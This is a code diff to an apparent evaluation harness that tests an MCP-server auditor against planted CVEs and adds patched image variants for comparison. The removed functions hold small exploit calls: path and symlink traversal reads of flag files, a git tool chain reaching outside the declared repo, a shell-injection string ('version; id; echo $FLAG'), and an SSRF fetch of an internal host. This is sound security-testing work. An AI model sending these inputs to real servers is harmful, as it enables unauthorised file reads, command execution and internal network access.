@@ -2,8 +2,10 @@ import re
 from collections.abc import AsyncGenerator, Awaitable, Callable, Generator, Sequence
 from contextlib import AbstractContextManager, asynccontextmanager, contextmanager
 from dataclasses import dataclass
+from enum import StrEnum
 from pathlib import Path
 
+from evals import cve_exploits
 from evals.concurrency import entered_in_thread
 from evals.cve_environments import (
     Launch,
@@ -26,6 +28,12 @@ from evals.cve_planting import (
 )
 from evals.cve_planting import planting_spec as compute_planting_spec
 from mcp_auditor.domain.ports import MCPClientPort
+
+
+class TargetVersion(StrEnum):
+    VULNERABLE = "vulnerable"
+    PATCHED = "patched"
+
 
 # The filesystem CVEs surface the leak through a read tool, but the blind
 # generator first needs list_directory to discover the planted symlink.
@@ -52,6 +60,7 @@ class CVETarget:
     kept_places: tuple[str, ...]  # location ids the flaw alone reaches, empty until filled
     images: tuple[str, ...]  # services of evals/docker/compose.yml
     server_image: str  # the service of images that runs the server under audit
+    patched_image: str  # the patched twin of server_image (never the sentinel sidecar)
     planting_host: PlantingHost  # what this target's launch can hold (user, cwd, network)
     builder: Callable[[str, PlantingSpec], AbstractContextManager[Launch]]  # (image tag, spec)
     exploits: tuple[Callable[[MCPClientPort], Awaitable[None]], ...]
@@ -67,16 +76,23 @@ class CVETarget:
         return compute_planting_spec(to_plant, self.planting_host, nonces)
 
     @contextmanager
-    def environment(self, spec: PlantingSpec) -> Generator[PlantedLaunch]:
-        with self.builder(image_tag(self.server_image), spec) as launch:
+    def environment(
+        self, spec: PlantingSpec, version: TargetVersion = TargetVersion.VULNERABLE
+    ) -> Generator[PlantedLaunch]:
+        service = self.patched_image if version is TargetVersion.PATCHED else self.server_image
+        with self.builder(image_tag(service), spec) as launch:
             yield PlantedLaunch(launch, spec.nonces)
 
     @asynccontextmanager
     async def launched(
-        self, to_plant: Sequence[Place], *, nonces: NonceSource = RANDOM_NONCES
+        self,
+        to_plant: Sequence[Place],
+        *,
+        version: TargetVersion = TargetVersion.VULNERABLE,
+        nonces: NonceSource = RANDOM_NONCES,
     ) -> AsyncGenerator[PlantedLaunch]:
         spec = self.planting_spec(to_plant, nonces)
-        async with entered_in_thread(self.environment(spec)) as planted_launch:
+        async with entered_in_thread(self.environment(spec, version)) as planted_launch:
             yield planted_launch
 
 
@@ -91,52 +107,6 @@ class OutOfScopeCVE:
 _HOST_NO_NETWORK = PlantingHost(SymbolicUser.HOST, "/", has_network=False)
 _UNPRIVILEGED_NO_NETWORK = PlantingHost(SymbolicUser.UNPRIVILEGED, "/", has_network=False)
 _UNPRIVILEGED_WITH_NETWORK = PlantingHost(SymbolicUser.UNPRIVILEGED, "/", has_network=True)
-
-
-async def _exploit_symlink_traversal(client: MCPClientPort) -> None:
-    await client.call_tool("read_file", {"path": "/work/sandbox/report"})
-
-
-async def _exploit_prefix_collision(client: MCPClientPort) -> None:
-    await client.call_tool("read_file", {"path": "/work/sandbox_secret/flag.txt"})
-
-
-async def _list_sandbox(client: MCPClientPort) -> None:
-    await client.call_tool("list_directory", {"path": "/work/sandbox"})
-
-
-async def _exploit_repository_bypass(client: MCPClientPort) -> None:
-    await client.call_tool("git_log", {"repo_path": "/work/other"})
-
-
-async def _benign_repository_bypass(client: MCPClientPort) -> None:
-    await client.call_tool("git_log", {"repo_path": "/work/repo"})
-
-
-async def _exploit_git_init_traversal(client: MCPClientPort) -> None:
-    await client.call_tool("git_init", {"repo_path": "/work/secret"})
-    await client.call_tool("git_add", {"repo_path": "/work/secret", "files": ["."]})
-    await client.call_tool("git_diff_staged", {"repo_path": "/work/secret"})
-
-
-async def _benign_git_init_traversal(client: MCPClientPort) -> None:
-    await client.call_tool("git_diff_staged", {"repo_path": "/work/repo"})
-
-
-async def _exploit_kubernetes_injection(client: MCPClientPort) -> None:
-    await client.call_tool("kubectl_generic", {"command": "version; id; echo $FLAG"})
-
-
-async def _benign_kubernetes_injection(client: MCPClientPort) -> None:
-    await client.call_tool("kubectl_generic", {"command": "version"})
-
-
-async def _exploit_fetch_ssrf(client: MCPClientPort) -> None:
-    await client.call_tool("fetch_txt", {"url": "http://sentinel/"})
-
-
-async def _benign_fetch_ssrf(client: MCPClientPort) -> None:
-    await client.call_tool("fetch_txt", {"url": "http://example.invalid/"})
 
 
 # The aims describe the flaw class from the published mechanism, not the planted instance,
@@ -182,10 +152,11 @@ CVE_TARGETS: list[CVETarget] = [
         kept_places=(),
         images=("filesystem",),
         server_image="filesystem",
+        patched_image="filesystem-patched",
         planting_host=_HOST_NO_NETWORK,
         builder=filesystem_env,
-        exploits=(_exploit_symlink_traversal,),
-        benign=_list_sandbox,
+        exploits=(cve_exploits.exploit_symlink_traversal,),
+        benign=cve_exploits.list_sandbox,
         awaited_capability="cross-tool chains",
         note=(
             "Symlink inside the allowed dir; needs list_directory discovery then read_file. "
@@ -203,10 +174,11 @@ CVE_TARGETS: list[CVETarget] = [
         kept_places=(),
         images=("filesystem",),
         server_image="filesystem",
+        patched_image="filesystem-patched",
         planting_host=_HOST_NO_NETWORK,
         builder=prefix_collision_env,
-        exploits=(_exploit_prefix_collision,),
-        benign=_list_sandbox,
+        exploits=(cve_exploits.exploit_prefix_collision,),
+        benign=cve_exploits.list_sandbox,
         awaited_capability="declared-scope awareness",
         note="Prefix-collision sibling is derivable only from the declared boundary.",
         tools_filter=FILESYSTEM_READ_TOOLS,
@@ -220,10 +192,11 @@ CVE_TARGETS: list[CVETarget] = [
         kept_places=(),
         images=("git",),
         server_image="git",
+        patched_image="git-patched-68145",
         planting_host=_HOST_NO_NETWORK,
         builder=repository_bypass_env,
-        exploits=(_exploit_repository_bypass,),
-        benign=_benign_repository_bypass,
+        exploits=(cve_exploits.exploit_repository_bypass,),
+        benign=cve_exploits.benign_repository_bypass,
         awaited_capability="declared-scope awareness",
         note="--repository bypass needs the generator to aim outside the declared repo.",
         tools_filter=frozenset({"git_log"}),
@@ -237,10 +210,11 @@ CVE_TARGETS: list[CVETarget] = [
         kept_places=(),
         images=("git",),
         server_image="git",
+        patched_image="git-patched-68143",
         planting_host=_HOST_NO_NETWORK,
         builder=git_init_traversal_env,
-        exploits=(_exploit_git_init_traversal,),
-        benign=_benign_git_init_traversal,
+        exploits=(cve_exploits.exploit_git_init_traversal,),
+        benign=cve_exploits.benign_git_init_traversal,
         awaited_capability="cross-tool chains + declared-scope awareness",
         note="git_init(out-of-scope) -> git_add(.) -> git_diff_staged surfaces the content.",
         tools_filter=frozenset({"git_init", "git_add", "git_diff_staged"}),
@@ -258,10 +232,11 @@ CVE_TARGETS: list[CVETarget] = [
         kept_places=(),
         images=("kubernetes",),
         server_image="kubernetes",
+        patched_image="kubernetes-patched",
         planting_host=_UNPRIVILEGED_NO_NETWORK,
         builder=command_injection_env,
-        exploits=(_exploit_kubernetes_injection,),
-        benign=_benign_kubernetes_injection,
+        exploits=(cve_exploits.exploit_kubernetes_injection,),
+        benign=cve_exploits.benign_kubernetes_injection,
         awaited_capability=None,
         note="Command injection via kubectl_generic (execSync shell), surfaces an env nonce.",
         tools_filter=frozenset({"kubectl_generic"}),
@@ -275,10 +250,11 @@ CVE_TARGETS: list[CVETarget] = [
         kept_places=(),
         images=("fetch", "sentinel"),
         server_image="fetch",
+        patched_image="fetch-patched",
         planting_host=_UNPRIVILEGED_WITH_NETWORK,
         builder=ssrf_env,
-        exploits=(_exploit_fetch_ssrf,),
-        benign=_benign_fetch_ssrf,
+        exploits=(cve_exploits.exploit_fetch_ssrf,),
+        benign=cve_exploits.benign_fetch_ssrf,
         awaited_capability="declared-scope awareness",
         note="SSRF via is_ip_private bypass; a Docker sidecar serves the internal endpoint.",
         tools_filter=frozenset({"fetch_txt"}),
